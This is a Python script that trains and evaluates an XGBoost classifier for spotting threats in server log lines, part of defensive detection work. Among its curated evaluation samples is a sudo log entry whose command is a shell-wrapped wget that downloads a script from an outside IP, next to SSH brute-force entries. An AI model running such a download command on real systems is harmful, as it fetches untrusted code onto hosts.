#!/usr/bin/env python3
"""Train log_threat_v1 — baseline XGBoost on the LOG-ML-P1 unified CSV.

Usage (from backend/):  uv run python ../scripts/train_log_model_v1.py
                        [--csv PATH] [--seed 1337] [--benign-ratio 3]

Pipeline (mirrors backend/ml/train_email_model.py):
  1. load data/datasets/log_threat/log_threat_unified.csv (gitignored; see
     docs/log_model_dataset.md for provenance)
  2. group-aware 80/10/10 split on split_key (never row-random — leakage control)
  3. balance TRAIN ONLY: subsample benign to 3x (suspicious+malicious)
  4. features: TF-IDF unigrams+bigrams (max 10k, train-fit) + numeric features
     from app/services/log_features.py (single implementation)
  5. XGBClassifier (multi:softprob) with early stopping on the grouped val set
  6. save backend/models/log_threat_v1.pkl (joblib bundle) +
     backend/models/log_threat_v1_features.json (manifest)

No serving wiring yet — inference integration is a later phase.
"""

from __future__ import annotations

import argparse
import csv
import hashlib
import json
import random
import sys
import time
from collections import Counter
from datetime import datetime, timezone
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[1]
BACKEND_DIR = REPO_ROOT / "backend"
sys.path.insert(0, str(BACKEND_DIR))

import joblib  # noqa: E402
import numpy as np  # noqa: E402
from scipy import sparse  # noqa: E402
from sklearn.metrics import (  # noqa: E402
    accuracy_score,
    classification_report,
    f1_score,
)
from xgboost import XGBClassifier  # noqa: E402

from app.services.log_features import (  # noqa: E402
    LABELS,
    LABEL_TO_IDX,
    NUMERIC_FEATURES,
    build_vectorizer,
    extract_features,
    group_split,
    ngram_text,
)
from app.services.log_blend import blend_scores  # noqa: E402
from app.services.log_heuristic import classify_heuristic  # noqa: E402

DEFAULT_CSV = REPO_ROOT / "data" / "datasets" / "log_threat" / "log_threat_unified.csv"
MODELS_DIR = BACKEND_DIR / "models"
SEED = 1337


def load_csv(path: Path) -> list[dict]:
    with open(path, newline="", encoding="utf-8") as f:
        rows = list(csv.DictReader(f))
    if not rows:
        raise SystemExit(f"empty dataset: {path}")
    return rows


def balance_train(rows: list[dict], benign_ratio: int, rng: random.Random) -> list[dict]:
    """Subsample benign to benign_ratio x the suspicious+malicious count."""
    by_class: dict[str, list[dict]] = {label: [] for label in LABELS}
    for r in rows:
        by_class[r["label"]].append(r)
    threat_count = len(by_class["suspicious"]) + len(by_class["malicious"])
    cap = min(len(by_class["benign"]), benign_ratio * max(threat_count, 1))
    benign = rng.sample(by_class["benign"], cap)
    out = benign + by_class["suspicious"] + by_class["malicious"]
    rng.shuffle(out)
    return out


def _matrix(rows: list[dict], vectorizer, fit: bool = False) -> sparse.csr_matrix:
    texts = [ngram_text(r["raw_line"]) for r in rows]
    text_matrix = vectorizer.fit_transform(texts) if fit else vectorizer.transform(texts)
    numeric = sparse.csr_matrix(
        [[extract_features(r["raw_line"], r.get("source", ""))[n] for n in NUMERIC_FEATURES]
         for r in rows],
        dtype=float,
    )
    return sparse.hstack([text_matrix, numeric]).tocsr()


def evaluate_bundle(bundle: dict, samples: list[dict]) -> list[dict]:
    """Heuristic -> ML -> blend for curated sample rows (eval harness)."""
    vec = bundle["vectorizer"]
    model = bundle["model"]
    matrix = _matrix(samples, vec)
    proba = model.predict_proba(matrix)
    results = []
    for row, probs in zip(samples, proba):
        heur = classify_heuristic(row["raw_line"])
        ml_threat = float(probs[LABEL_TO_IDX["suspicious"]] + probs[LABEL_TO_IDX["malicious"]])
        blended = blend_scores(heur["severity"], ml_threat)
        results.append({
            "raw_line": row["raw_line"],
            "expected": row.get("expected_severity", ""),
            "heuristic": heur["severity"],
            "ml_threat_probability": round(ml_threat, 3),
            "risk_score": blended["risk_score"],
            "severity": blended["severity"],
            "mitre": heur["mitre"],
        })
    return results


EVAL_SAMPLES = [
    {"raw_line": "Failed password for invalid user admin from 203.0.113.7 port 41000 ssh2", "expected_severity": "high"},
    {"raw_line": "Mar 10 03:12:09 srv-auth01 sshd[4242]: Failed password for root from 198.51.100.9 port 50001 ssh2", "expected_severity": "high"},
    {"raw_line": "Mar 10 03:12:44 srv-auth01 sshd[4243]: Accepted password for deploy from 198.51.100.9 port 50002 ssh2", "expected_severity": "medium"},
    {"raw_line": "Jun 14 15:16:01 combo sshd(pam_unix): authentication failure; logname= uid=0 euid=0 tty=NODEVssh ruser= rhost=203.0.113.99", "expected_severity": "high"},
    {"raw_line": "Mar 10 04:00:01 srv-auth01 sudo: backup : 3 incorrect password attempts ; TTY=pts/1 ; USER=root ; COMMAND=/usr/bin/systemctl", "expected_severity": "high"},
    {"raw_line": "Mar 10 04:00:02 srv-auth01 sudo: deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh -c wget http://203.0.113.5/x.sh", "expected_severity": "medium"},
    {"raw_line": "Mar 10 04:01:00 srv-auth01 su: FAILED SU (to root) backup on pts/2", "expected_severity": "high"},
    {"raw_line": "instruction cache parity error corrected", "expected_severity": "low"},
    {"raw_line": "PacketResponder 1 for block blk_-1608999687919862906 terminating", "expected_severity": "info"},
    {"raw_line": "Receiving block blk_-2126554733521224025 src: /10.251.199.86:42666 dest: /10.251.199.86:50010", "expected_severity": "info"},
]


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--csv", type=Path, default=DEFAULT_CSV)
    ap.add_argument("--seed", type=int, default=SEED)
    ap.add_argument("--benign-ratio", type=int, default=3)
    ap.add_argument("--n-estimators", type=int, default=400)
    args = ap.parse_args()

    rng = random.Random(args.seed)
    t0 = time.time()
    rows = load_csv(args.csv)
    print(f"[data] {len(rows)} rows from {args.csv}")

    # 1. grouped split on split_key (80/10/10)
    keys = [r["split_key"] for r in rows]
    train_keys, val_keys, test_keys = group_split(keys, (0.8, 0.1, 0.1), seed=args.seed)
    part = lambda r: (  # noqa: E731
        0 if r["split_key"] in train_keys else 1 if r["split_key"] in val_keys else 2
    )
    parts = [part(r) for r in rows]
    train_rows = [r for r, p in zip(rows, parts) if p == 0]
    val_rows = [r for r, p in zip(rows, parts) if p == 1]
    test_rows = [r for r, p in zip(rows, parts) if p == 2]
    print(f"[split] train={len(train_rows)} val={len(val_rows)} test={len(test_rows)} "
          f"(groups: {len(train_keys)}/{len(val_keys)}/{len(test_keys)})")
    assert not (train_keys & val_keys or train_keys & test_keys or val_keys & test_keys)

    # 2. balance train only
    train_bal = balance_train(train_rows, args.benign_ratio, rng)
    print(f"[balance] train {len(train_rows)} -> {len(train_bal)} "
          f"({dict(Counter(r['label'] for r in train_bal))})")

    # 3. features: TF-IDF (train-fit) + numeric
    vectorizer = build_vectorizer()
    X_train = _matrix(train_bal, vectorizer, fit=True)  # vectorizer fitted here
    y_train = np.array([LABEL_TO_IDX[r["label"]] for r in train_bal])
    X_val = _matrix(val_rows, vectorizer)
    y_val = np.array([LABEL_TO_IDX[r["label"]] for r in val_rows])
    X_test = _matrix(test_rows, vectorizer)
    y_test = np.array([LABEL_TO_IDX[r["label"]] for r in test_rows])
    n_features = X_train.shape[1]
    print(f"[features] {n_features} ({len(vectorizer.get_feature_names_out())} text + {len(NUMERIC_FEATURES)} numeric)")

    # 4. model
    model = XGBClassifier(
        objective="multi:softprob",
        num_class=3,
        eval_metric="mlogloss",
        tree_method="hist",
        n_estimators=args.n_estimators,
        learning_rate=0.1,
        max_depth=6,
        subsample=0.9,
        colsample_bytree=0.8,
        early_stopping_rounds=30,
        random_state=args.seed,
        n_jobs=-1,
    )
    model.fit(X_train, y_train, eval_set=[(X_val, y_val)], verbose=False)
    print(f"[model] best_iteration={model.best_iteration} trees={model.n_estimators}")

    # 5. metrics
    y_pred = model.predict(X_test)
    acc = accuracy_score(y_test, y_pred)
    macro_f1 = f1_score(y_test, y_pred, average="macro")
    report = classification_report(y_test, y_pred, target_names=LABELS, output_dict=True, zero_division=0)
    print(f"[metrics] accuracy={acc:.4f} macro_f1={macro_f1:.4f}")
    for label in LABELS:
        m = report[label]
        print(f"  {label:10s} precision={m['precision']:.3f} recall={m['recall']:.3f} f1={m['f1-score']:.3f} support={int(m['support'])}")
    if macro_f1 <= 0.7:
        print("WARNING: macro F1 below 0.7 baseline target")

    # 6. eval harness on 10 curated samples
    print("[eval-samples]")
    sample_results = evaluate_bundle({"vectorizer": vectorizer, "model": model}, EVAL_SAMPLES)
    matches = sum(1 for s in sample_results if s["severity"] == s["expected"])
    for s in sample_results:
        print(f"  exp={s['expected'] or '-':6s} got={s['severity']:8s} risk={s['risk_score']:3d} "
              f"heur={s['heuristic']:8s} ml={s['ml_threat_probability']:.2f}  {s['raw_line'][:70]}")
    print(f"  exact severity matches: {matches}/{len(sample_results)}")

    # 7. save artifacts
    MODELS_DIR.mkdir(exist_ok=True)
    pkl_path = MODELS_DIR / "log_threat_v1.pkl"
    manifest_path = MODELS_DIR / "log_threat_v1_features.json"
    bundle = {
        "version": "log_threat_v1",
        "labels": LABELS,
        "model": model,
        "vectorizer": vectorizer,
        "numeric_features": NUMERIC_FEATURES,
    }
    joblib.dump(bundle, pkl_path, compress=3)
    sha = hashlib.sha256(args.csv.read_bytes()).hexdigest()
    manifest = {
        "version": "log_threat_v1",
        "trained_at": datetime.now(timezone.utc).isoformat(),
        "csv_path": str(args.csv),
        "csv_sha256": sha,
        "seed": args.seed,
        "benign_ratio": args.benign_ratio,
        "split": {"ratios": [0.8, 0.1, 0.1], "key": "split_key", "grouped": True},
        "n_features_total": n_features,
        "n_text_features": int(len(vectorizer.get_feature_names_out())),
        "vectorizer_params": {
            "ngram_range": [1, 2], "max_features": 10000, "min_df": 2,
            "analyzer": "word (tokenizer=str.split on normalized tokens)",
        },
        "numeric_feature_names": NUMERIC_FEATURES,
        "labels": LABELS,
        "model_params": {
            "objective": "multi:softprob", "tree_method": "hist",
            "max_depth": 6, "learning_rate": 0.1,
            "n_estimators": int(model.n_estimators),
            "best_iteration": int(model.best_iteration),
        },
        "metrics": {
            "accuracy": round(float(acc), 4),
            "macro_f1": round(float(macro_f1), 4),
            "per_class": {k: {m: round(float(v), 4) for m, v in report[k].items() if isinstance(v, (int, float))}
                          for k in LABELS},
        },
        "eval_samples_exact_matches": f"{matches}/{len(sample_results)}",
        "sizes": {"train": len(train_bal), "val": len(val_rows), "test": len(test_rows)},
    }
    manifest_path.write_text(json.dumps(manifest, indent=2))
    size_mb = pkl_path.stat().st_size / 1e6
    print(f"[save] {pkl_path} ({size_mb:.1f} MB), manifest {manifest_path}")
    print(f"[done] {time.time() - t0:.0f}s")


if __name__ == "__main__":
    main()
